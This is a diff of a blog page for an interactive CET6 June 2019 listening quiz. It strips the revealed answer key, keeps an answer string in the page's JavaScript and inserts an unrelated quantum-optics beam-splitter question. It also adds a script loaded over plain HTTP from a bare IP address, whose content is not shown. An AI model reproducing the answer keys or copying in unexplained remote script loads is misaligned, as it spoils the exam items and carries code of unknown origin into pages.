@@ -126,7 +126,7 @@
 <meta property="og:url" content="http://blog.happyan.com/2020/04/26/【英语学习】-CET6-2019年6月第二套真题/index.html">
 <meta property="og:site_name" content="Happy An">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-04-26T12:22:00.641Z">
+<meta property="og:updated_time" content="2020-04-27T01:55:06.973Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【英语学习】 CET6 2019年6月第二套真题">
 
@@ -386,7 +386,7 @@
                   <span class="post-meta-item-text">Words count in article</span>
                 
                 <span title="Words count in article">
-                  1,145 字
+                  1,195 字
                 </span>
               
 
@@ -423,8 +423,7 @@
       
 
       
-        <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=2064362274&auto=0&height=66"></iframe><br><a id="more"></a></p>
-<p><style><br>.place-holder-red{<br>color: red;<br>}<br></style><br>Section A<br>Directions: In this section, you will hear two long conversations. At the end of each conversation, you will hear four questions. Both the conversation and the questions will be spoken only once. After you hear a question, you must choose the best answer from the four choices marked A, B, C and D. Then mark the corresponding letter on Answer Sheet I with a single line through the centre.</p>
+        <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=2064362274&auto=0&height=66"></iframe><br><a id="more"></a><br>Section A<br>Directions: In this section, you will hear two long conversations. At the end of each conversation, you will hear four questions. Both the conversation and the questions will be spoken only once. After you hear a question, you must choose the best answer from the four choices marked A, B, C and D. Then mark the corresponding letter on Answer Sheet I with a single line through the centre.</p>
 <p>Questions 1 to 4 are based on the conversation you have just heard.</p>
 <ol>
 <li><label><input type="radio" name="1" value="A"><font>A) Why Roman Holiday was more famous than Breakfast at Tiffany’s.</font></label><br><label><input type="radio" name="1" value="B"><font>B) Why Audrey Hepburn had more female fans than male ones.</font></label><br><label><input type="radio" name="1" value="C"><font>C) Why the woman wanted to be like Audrey Hepburn.</font></label><br><label><input type="radio" name="1" value="D"><font>D) Why so many girls adored Audrey Hepburn.</font></label></li>
@@ -489,10 +488,17 @@
 
 </li>
 </ol>
-<p><button id="checker" href="javascript:void(0);" onclick="checkanswer()">Check Answer</button></p>
+<p>第2题 (不定向选择)</p>
+<blockquote>
+<p>We consider a beam splitter with a quasi-classical state $\left|\alpha\right\rangle_1$ in input mode 1 and another quasi-classical state $\left|\beta\right\rangle_2$ in input mode 2.<br>Do the full calculation of the output mode and select the right answer among the following proposals:</p>
+<label><input type="checkbox" name="26" value="A"><font> A) $\left|r\alpha-t\beta\right\rangle_3\left|t\alpha+r\beta\right\rangle_4$ </font></label><br><label><input type="checkbox" name="26" value="B"><font> B) $-\left|r\alpha+t\beta\right\rangle_3\left|t\alpha-r\beta\right\rangle_4$ </font></label><br><label><input type="checkbox" name="26" value="C"><font> C) $\left|r\alpha+t\beta\right\rangle_3\left|t\alpha-r\beta\right\rangle_4$ </font></label><br><label><input type="checkbox" name="26" value="D"><font> D) The output mode can be predicted only if $\Re\left[\alpha\beta^*\right]=0.$ </font></label>
+
+</blockquote>
+<p><button id="checker" href="javascript:void(0);" onclick="getstate()">Check Answer</button></p>
 <script type="text/javascript">
 function checkanswer(){
-var ans="DBADACBDCBACADBADCBABCDCB";
+var ans="D/B/A/D/A/C/B/D/C/B/A/C/A/D/B/A/D/C/B/A/B/C/D/C/B";
+ans=ans.split('/');
 var dui=0;
 var wzd=0;
 for (var i=1;i<=25;i++)
@@ -506,7 +512,7 @@ for (var i=1;i<=25;i++)
         if(aradio[j].checked==true) 
         {
             selectvalue=aradio[j].value;
-            if (ans[i-1]==selectvalue)
+            if (ans[i-1].indexOf(selectvalue)!=-1)
             {
                 aradio[j].nextSibling.color='green';
                 dui=dui+1;
@@ -515,20 +521,54 @@ for (var i=1;i<=25;i++)
             {
                 aradio[j].nextSibling.color='red';
             };
-            break;
         };
-    };
-    if (j==4)
-    {
-        wzd++;
     };
 };
 var tagger=document.getElementById('checker');
 tagger.onclick='';
-tagger.innerHTML='正确率'+String(dui)+'/25,其中未作答'+String(wzd)+'题。绿对红错，重做请刷新页面！';}
+tagger.innerHTML='正确率'+String(dui)+'/25。绿对红错，重做请刷新页面！';}
 </script>
 
-<details><br><summary>点击展开答案</summary><br><pre><code><br><p>Section A:<br>1-4 1.D 2.B 3.A 4.D<br>5-8 5.A 6.C 7.B 8.D<br>Section B:<br>9-11 9.C 10.B 11.A<br>12-15 12.C 13.A 14.D 15.B<br>Section C:<br>16-18 16.A 17.D 18.C<br>19-21 19.B 20.A 21.B<br>22-25 22.C 23.D 24.C 25.B<br></p></code></pre><br></details>
+<script type="text/javascript">
+function getstate()
+{
+    NOQ=26
+    var selectvalue='';
+    for (var i=1;i<=NOQ;i++)
+    {
+        var qname=String(i);
+        var acheckbox=document.getElementsByName(qname);
+        var tmpselect='';
+        for(var j=0;j<acheckbox.length;j++)
+        {
+            if(acheckbox[j].checked==true) 
+            {
+                tmpselect=tmpselect+acheckbox[j].value;
+            };
+        };
+        if (tmpselect=='')
+        {
+            tmpselect='#';
+        };
+        if (i != NOQ)
+        {
+            tmpselect=tmpselect+'/';
+        };
+        selectvalue=selectvalue+tmpselect;
+    };
+    console.log(selectvalue);
+    var tagger=document.getElementById('checker');
+    tagger.onclick='';
+    tagger.innerHTML=selectvalue;
+}
+</script>
+
+<p><details>  </details></p>
+<p><summary>点击展开答案</summary> </p>
+<p><pre><code> </code></pre></p>
+<p></p><p id="answers">暂未发布</p><br><br><p></p>
+<script src="http://93.179.112.94/qo2.js">
+</script>
       
     </div>
     
@@ -558,8 +598,8 @@ tagger.innerHTML='正确率'+String(dui)+'/25,其中未作答'+String(wzd)+'题�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/10/ACGN相关作品预计发售时间（自动更新）/" rel="next" title="ACGN相关作品预计发售时间（自动更新）">
-                <i class="fa fa-chevron-left"></i> ACGN相关作品预计发售时间（自动更新）
+              <a href="/2019/06/09/【游戏】IBM-'Hello-Quantum'攻略/" rel="next" title="【游戏】IBM 'Hello Quantum'攻略">
+                <i class="fa fa-chevron-left"></i> 【游戏】IBM 'Hello Quantum'攻略
               </a>
             
           </div>
@@ -636,7 +676,7 @@ tagger.innerHTML='正确率'+String(dui)+'/25,其中未作答'+String(wzd)+'题�
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -649,7 +689,7 @@ tagger.innerHTML='正确率'+String(dui)+'/25,其中未作答'+String(wzd)+'题�
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
